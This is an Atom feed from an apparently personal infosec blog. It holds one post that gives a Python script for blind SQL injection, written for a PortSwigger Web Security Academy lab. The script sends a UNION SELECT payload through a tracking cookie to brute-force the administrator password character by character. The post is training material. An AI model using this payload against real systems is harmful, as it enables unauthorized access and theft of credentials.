<?xml version="1.0" encoding="utf-8"?>

<feed xmlns="http://www.w3.org/2005/Atom" >
  <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
  <link href="https://darrynbrownfield.co.uk/tag/websecurityacademy/feed.xml" rel="self" type="application/atom+xml" />
  <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
  <updated>2022-08-20T23:17:34+00:00</updated>
  <id>https://darrynbrownfield.co.uk/tag/websecurityacademy/feed.xml</id>

  
  
  

  
    <title type="html">Darryn Brownfield | </title>
  

  
    <subtitle>Infosec | Hacking | CTF</subtitle>
  

  

  
    
      
    
  

  
  

  
    <entry>
      <title type="html">Blind SQL injection with conditional responses script</title>
      <link href="https://darrynbrownfield.co.uk/blindsqli" rel="alternate" type="text/html" title="Blind SQL injection with conditional responses script" />
      <published>2021-01-02T00:00:00+00:00</published>
      <updated>2021-01-02T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/blindsqli</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/blindsqli">&lt;p&gt;&lt;img src=&quot;/assets/images/websecacademy/blindsql/cover.jpeg&quot; alt=&quot;blindsql&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;This post is to provide the script I created to automate the process of using blind SQL injection with conditional responses to brute force a password. This was completed for a lab while completing the SQL Injection topic on &lt;a href=&quot;https://portswigger.net/web-security&quot;&gt;WebSecurity Academy&lt;/a&gt;. I canâ€™t recommend this training enough, the content is well written and the labs are great and best of all its free!&lt;/p&gt;

&lt;p&gt;As part of the lab I completed the process 3 ways, manually using Burp repeater, using Burp intruder and finally by writing this Python script. I am still learning Python and this was a good exercise to do more Python coding and also reenforce the learning.&lt;/p&gt;

&lt;h3 id=&quot;final-script&quot;&gt;Final Script&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# 02/01/21
# blind-sql-lab.py
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# POC script to automate getting the administrator password using blind sql conditional responses

import requests
import string

url = &quot;&quot; # Insert URL here!

cookievalue = &quot;&quot;
password = &quot;&quot;

cookies = {'TrackingId':cookievalue}

characters = list(string.ascii_lowercase)
characters = characters + list(string.digits)

for i in range(1,21):
    for char in characters:
        cookievalue = &quot;x'+UNION SELECT+'a' FROM users WHERE username='administrator' AND substring(password,{},1)='{}'--&quot;.format(i,char)
        cookies = {'TrackingId':cookievalue}
        r = requests.get(url, cookies=cookies)
        response = r.text
        if &quot;Welcome back!&quot; in response:
            print(char)
            password = password + char
            
print(&quot;Password is: &quot; + password)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;next-steps&quot;&gt;Next Steps&lt;/h3&gt;

&lt;p&gt;The script could be a lot better, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Initial check to test the website is up&lt;/li&gt;
  &lt;li&gt;Run a test conditional check to test for SQL injection&lt;/li&gt;
  &lt;li&gt;Automate the process of finding the password length and pass to the range function&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="websecurityacademy" />
      
        <category term="sqli" />
      
        <category term="python" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
</feed>
